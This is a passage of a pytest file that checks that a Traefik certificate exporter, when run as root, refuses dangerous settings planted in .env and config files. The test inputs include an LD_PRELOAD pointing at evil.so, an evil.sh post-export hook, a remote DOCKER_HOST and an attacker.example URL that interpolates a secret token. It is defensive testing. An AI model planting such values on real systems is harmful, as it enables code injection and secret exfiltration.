    "FLAT": "false",
    "TRAEFIK_CERTIFICATE_EXPORTER_RESTART_CONTAINERS": "true",
}
_LEGACY_WARNINGS = (
    (
        "Legacy setting FLAT in environment is ignored; "
        "use TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_FLAT"
    ),
    (
        "Legacy setting TRAEFIK_CERTIFICATE_EXPORTER_RESTART_CONTAINERS in environment "
        "is ignored; use TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_RESTARTCONTAINERS"
    ),
)


@pytest.mark.parametrize("euid", [0, 1000])
def test_a_legacy_name_in_a_dotenv_file_is_reported_once_as_legacy(
    caplog, tmp_path, monkeypatch, euid
):
    import os
    from argparse import Namespace

    configFile, _user, cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, euid)
    for name in (*_DOTENV_LEGACY, "LD_PRELOAD"):
        monkeypatch.setenv(name, "placeholder")
        monkeypatch.delenv(name)
    cwdEnv.write_text(
        "".join(f"{name}={value}\n" for name, value in _DOTENV_LEGACY.items())
        + "LD_PRELOAD=/config/evil.so\n",
        encoding="utf-8",
    )

    with caplog.at_level(logging.INFO):
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())

    warnings = [r.getMessage() for r in caplog.records if r.levelno == logging.WARNING]
    for expected in _LEGACY_WARNINGS:
        assert warnings.count(expected) == 1, warnings
    # The legacy names set nothing, in either mode.
    assert manager.settings.flat is False
    assert manager.settings.restartContainers is False
    dotenvErrors = [m for m in _errors(caplog) if ".env file" in m]
    if euid == 0:
        for name in (*_DOTENV_LEGACY, "LD_PRELOAD"):
            assert name not in os.environ, name
        # The root-mode ERROR still reports the other variable, and only that one.
        assert len(dotenvErrors) == 1, dotenvErrors
        assert "LD_PRELOAD" in dotenvErrors[0]
        for name in _DOTENV_LEGACY:
            assert name not in dotenvErrors[0], dotenvErrors[0]
    else:
        assert dotenvErrors == []


def test_root_warns_once_about_a_legacy_name_in_the_real_environment(
    caplog, tmp_path, monkeypatch
):
    """The process environment is never filtered: the legacy warning alone reports it."""
    import os
    from argparse import Namespace

    configFile, _user, _cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, 0)
    monkeypatch.setenv("FLAT", "1")

    with caplog.at_level(logging.INFO):
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())

    warnings = [r.getMessage() for r in caplog.records if r.levelno == logging.WARNING]
    assert warnings.count(_LEGACY_WARNINGS[0]) == 1, warnings
    assert os.environ["FLAT"] == "1"
    assert _errors(caplog) == []


# F9 (review E015-S01-001): confuse's `EnvSource` maps an indexed name to a list element,
# and `config_default.yaml` documents `..._SETTINGS_APPRISEURLS_0` as *the* way to set
# `appriseurls` from the environment. In root mode a `.env` setting an `any-source` list in
# that form must still load; the same form of an environment-only key must not.
_INDEXED_ANY_SOURCE = {
    "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_APPRISEURLS_0": "json://203.0.113.10/hook",
    "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_APPRISEURLS_1": "json://203.0.113.11/hook",
    "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_DOMAINS_INCLUDE_0": "example.com",
}
_INDEXED_ENVIRONMENT_ONLY = {
    "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_POSTEXPORTCOMMAND_0": "/config/evil.sh",
    "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_OUTPUTPATH_X": "/config/out",
    # An index under a scalar `any-source` key: not a list in the packaged default.
    "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_DRYRUN_0": "true",
}


def test_root_loads_an_indexed_any_source_list_from_a_dotenv_file(
    caplog, tmp_path, monkeypatch
):
    import os
    from argparse import Namespace

    configFile, _user, cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, 0)
    planted = {**_INDEXED_ANY_SOURCE, **_INDEXED_ENVIRONMENT_ONLY}
    for name in planted:
        monkeypatch.setenv(name, "placeholder")
        monkeypatch.delenv(name)
    cwdEnv.write_text(
        "".join(f"{name}={value}\n" for name, value in planted.items()),
        encoding="utf-8",
    )

    with caplog.at_level(logging.INFO):
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())

    for name, value in _INDEXED_ANY_SOURCE.items():
        assert os.environ.get(name) == value, name
    assert len(manager.settings.appriseUrls) == 2
    assert manager.settings.domains["include"] == ["example.com"]
    for name in _INDEXED_ENVIRONMENT_ONLY:
        assert name not in os.environ, name
    assert manager.settings.postExportCommand is None
    errors = [m for m in _errors(caplog) if f".env file '{cwdEnv}'" in m]
    assert len(errors) == 1, _errors(caplog)
    for name in _INDEXED_ENVIRONMENT_ONLY:
        assert name in errors[0], errors[0]
    for name in _INDEXED_ANY_SOURCE:
        assert name not in errors[0], errors[0]


def test_root_keeps_a_non_setting_variable_the_real_environment_already_set(
    caplog, tmp_path, monkeypatch
):
    import os
    from argparse import Namespace

    configFile, _user, cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, 0)
    monkeypatch.setenv("DOCKER_HOST", "unix:///var/run/docker.sock")
    cwdEnv.write_text("DOCKER_HOST=tcp://203.0.113.9:2375\n", encoding="utf-8")

    with caplog.at_level(logging.INFO):
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())

    assert os.environ["DOCKER_HOST"] == "unix:///var/run/docker.sock"
    assert _errors(caplog) == []


_APPRISE_0_ENV = "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_APPRISEURLS_0"
_INTERPOLATED_URL = "json://attacker.example/?-hook=${" + _HOOK_ENV + "}"


def _load_interpolating_dotenv(monkeypatch, tmp_path, euid: int) -> str | None:
    """A `.env` whose `any-source` value references a secret in the real environment;
    returns the value the loader left in `os.environ` (AR-1 / RT-2, closure 2026-10-12)."""
    import os
    from argparse import Namespace

    configFile, _user, cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, euid)
    monkeypatch.setenv(_HOOK_ENV, "/usr/local/bin/notify --token s3cr3t-token")
    monkeypatch.setenv(_APPRISE_0_ENV, "placeholder")
    monkeypatch.delenv(_APPRISE_0_ENV)
    cwdEnv.write_text(f"{_APPRISE_0_ENV}={_INTERPOLATED_URL}\n", encoding="utf-8")
    manager = SettingsManager()
    manager.modulePath = moduleEnv.parent
    manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())
    return os.environ.get(_APPRISE_0_ENV)


def test_root_does_not_interpolate_the_real_environment_into_a_dotenv_value(
    tmp_path, monkeypatch
):
    value = _load_interpolating_dotenv(monkeypatch, tmp_path, 0)

    assert value == _INTERPOLATED_URL
    assert "s3cr3t-token" not in (value or "")


def test_non_root_dotenv_interpolation_is_unchanged(tmp_path, monkeypatch):
    value = _load_interpolating_dotenv(monkeypatch, tmp_path, 1000)

    assert value is not None and "s3cr3t-token" in value


def test_non_root_keeps_every_dotenv_variable(caplog, tmp_path, monkeypatch):
    import os

    manager, _dotenv = _load_with_planted_dotenv(caplog, monkeypatch, tmp_path, 1000)

    for name, value in _DOTENV_PLANTED.items():
        assert os.environ.get(name) == value, name
    assert manager.settings.dryRun is True
    assert _errors(caplog) == []


def test_root_withholding_logs_one_error_naming_the_file_and_not_the_value(
    caplog, tmp_path, monkeypatch
):
    with caplog.at_level(logging.INFO):
        _load_as(
            monkeypatch,
            tmp_path,
            euid=0,
            config=f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n',
        )

    errors = _errors(caplog)
    assert len(errors) == 1, errors
    assert errors[0].startswith(
        "Ignoring settings.postexportcommand from configuration file "
        f"'{tmp_path / 'config.yaml'}': this process runs as root"
    ), errors[0]
    assert "Using the default value instead." in errors[0]
    assert _HOOK_ENV in errors[0]
    assert "ADR-0049" in errors[0]
    assert not any(_FILE_HOOK in m for m in _messages(caplog, logging.DEBUG))


def test_non_root_takes_postexportcommand_from_the_config_file(
    caplog, tmp_path, monkeypatch
):
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=1000,
            config=(
                f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n'
                "  outputpath: /elsewhere/certs\n  datapath: /elsewhere/acme\n"
            ),
        )

    assert manager.settings.postExportCommand == _FILE_HOOK
    assert manager.settings.outputPath == "/elsewhere/certs"
    assert manager.settings.dataPath == "/elsewhere/acme"
    assert _errors(caplog) == []


def test_source_of_reports_environment_command_line_file_and_default(
    tmp_path, monkeypatch
):
    key = ("settings", "postexportcommand")

    manager = _load_as(monkeypatch, tmp_path / "default", euid=1000)
    assert manager.sourceOf(key) == "default"

    manager = _load_as(
        monkeypatch,
        tmp_path / "file",
        euid=1000,
        config=f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n',
    )
    assert (
        manager.sourceOf(key)
        == f"configuration file '{tmp_path / 'file' / 'config.yaml'}'"
    )

    manager = _load_as(
        monkeypatch, tmp_path / "env", euid=1000, env={_HOOK_ENV: "/bin/true"}
    )
    assert manager.sourceOf(key) == "environment"

    manager = _load_as(
        monkeypatch,
        tmp_path / "cli",
        euid=1000,
        env={_HOOK_ENV: "/bin/true"},
        cli={"settings.postexportcommand": "/bin/false"},
    )
    assert manager.sourceOf(key) == "command line"

    # "command line" is exact only because nothing but `set_args` adds a filename-less
    # source: the loader's sources are the CLI overlay, the environment, the config file,
    # the user config and the packaged default -- nothing else.
    import confuse

    anonymous = [
        s
        for s in manager._config.sources
        if s.filename is None and not isinstance(s, confuse.EnvSource)
    ]
    assert len(anonymous) == 1, manager._config.sources


@pytest.mark.parametrize(
    ("case", "config", "env", "cli", "key", "expected"),
    [
        ("file-only hook", True, {}, {}, "postexportcommand", "default"),
        (
            "file + environment",
            True,
            {_HOOK_ENV: "/bin/true"},
            {},
            "postexportcommand",
            "environment",
        ),
        (
            "file + command line",
            True,
            {},
            {"settings.postexportcommand": "/bin/true"},
            "postexportcommand",
            "command line",
        ),
        (
            "file outputpath, ENV value",
            True,
            {_OUTPUT_ENV: "/certs"},
            {},
            "outputpath",
            "environment",
        ),
    ],
)
def test_source_of_after_withholding_reports_the_real_fallback_source(
    tmp_path, monkeypatch, case, config, env, cli, key, expected
):
    manager = _load_as(
        monkeypatch,
        tmp_path,
        euid=0,
        config=(
            f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n'
            "  outputpath: /config/out\n"
        ),
        env=env,
        cli=cli,
    )

    assert manager.sourceOf(("settings", key)) == expected, case


def test_every_file_the_loader_reads_is_subject_to_the_root_rule(
    caplog, tmp_path, monkeypatch
):
    """The scope guard (AC 6, global rule 4): the files come from what the loader actually
    opens, recorded at confuse's `YamlSource` and at `load_dotenv`, never from a list."""
    from argparse import Namespace

    import confuse

    from traefik_certificate_exporter.libs import settings as settings_module

    read: dict[str, str] = {}
    originalYaml = confuse.sources.YamlSource.__init__
    originalDotenv = settings_module.load_dotenv

    def recordingYaml(self, filename=None, default=False, *args, **kwargs):
        originalYaml(self, filename, default, *args, **kwargs)
        if filename is not None and not default:
            read[str(filename)] = "yaml"

    def recordingDotenv(path, *args, **kwargs):
        read[str(path)] = "dotenv"
        return originalDotenv(path, *args, **kwargs)

    monkeypatch.setattr(confuse.sources.YamlSource, "__init__", recordingYaml)
    monkeypatch.setattr(settings_module, "load_dotenv", recordingDotenv)

    def run(planted: "str | None") -> "str | None":
        root = tmp_path / f"run-{len(runs)}"
        files = _isolate_loader(monkeypatch, root, 0)
        configFile, userConfig, _cwdEnv, moduleEnv = files
        userConfig.parent.mkdir(parents=True)
        for path in files:
            if path.name == ".env":
                path.write_text("TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_FLAT=true\n")
            else:
                path.write_text("settings:\n  flat: true\n")
        if planted is not None:
            # The same role in this run's tree: the file at the same position.
            target = files[[str(p) for p in placed].index(planted)]
            if read[planted] == "dotenv":
                target.write_text(f'{_HOOK_ENV}="{_FILE_HOOK}"\n')
            else:
                target.write_text(f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n')
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())
        runs.append(files)
        return manager.settings.postExportCommand

    runs: list = []
    placed: tuple = ()
    assert run(None) is None
    placed = runs[0]
    recorded = sorted(read)
    assert recorded, "the loader read no file; this guard examined nothing"
    unplantable = [p for p in recorded if p not in {str(x) for x in placed}]
    assert not unplantable, (
        f"the loader reads a file this guard does not place: {unplantable}"
    )

    leaked = []
    for path in recorded:
        if run(path) is not None:
            leaked.append(path)
    assert not leaked, f"a root load took postexportcommand from: {leaked}"
    assert len(recorded) == 4, recorded


@pytest.mark.parametrize(
    "value",
    ["/abs.json", "../x.json", "sub/x.json", "x\\y.json", "..", ".", "", "C:x.json"],
)
def test_file_spec_must_be_a_file_name_glob(caplog, tmp_path, monkeypatch, value):
    import ntpath

    from traefik_certificate_exporter.libs import settings as settings_module

    configFile = tmp_path / "config.yaml"
    with caplog.at_level(logging.INFO):
        if value == "C:x.json":
            # The drive form only exists where `os.path` is `ntpath`.
            monkeypatch.setattr(
                settings_module.os.path, "splitdrive", ntpath.splitdrive
            )
            monkeypatch.setattr(settings_module.os.path, "isabs", ntpath.isabs)
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=1000,
            config=f"settings:\n  filespec: '{value}'\n",
        )

    assert manager.settings.fileSpec == "*.json"
    errors = _errors(caplog)
    assert len(errors) == 1, errors
    assert errors[0].startswith(
        f"Ignoring settings.filespec from configuration file '{configFile}': it must "
        "be a file-name glob inside settings.datapath"
    ), errors[0]
    assert "Using the default '*.json' instead (ADR-0049)." in errors[0]
    if len(value) > 2:  # '.', '..' and '' occur in any sentence
        assert not any(value in m for m in _messages(caplog)), _messages(caplog)


@pytest.mark.parametrize("euid", [0, 1000])
@pytest.mark.parametrize("source", ["file", "environment", "command line"])
def test_file_spec_is_validated_from_every_source_and_every_euid(
    caplog, tmp_path, monkeypatch, source, euid
):
    value = "/abs.json"
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=euid,
            config=f"settings:\n  filespec: '{value}'\n" if source == "file" else None,
            env={_FILESPEC_ENV: value} if source == "environment" else None,
            cli={"settings.filespec": value} if source == "command line" else None,
        )

    expected = (
        f"configuration file '{tmp_path / 'config.yaml'}'"
        if source == "file"
        else source
    )
    assert manager.settings.fileSpec == "*.json"
    errors = _errors(caplog)
    assert len(errors) == 1, errors
    assert errors[0].startswith(f"Ignoring settings.filespec from {expected}: "), errors
    assert not any(value in m for m in _messages(caplog))


@pytest.mark.parametrize(
    "value", ["acme.json", "acme-*.json", "*.json", "[ab]*.json", "..json"]
)
def test_valid_file_spec_forms_are_kept(caplog, tmp_path, monkeypatch, value):
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=1000,
            config=f"settings:\n  filespec: '{value}'\n",
        )

    assert manager.settings.fileSpec == value
    assert _errors(caplog) == []
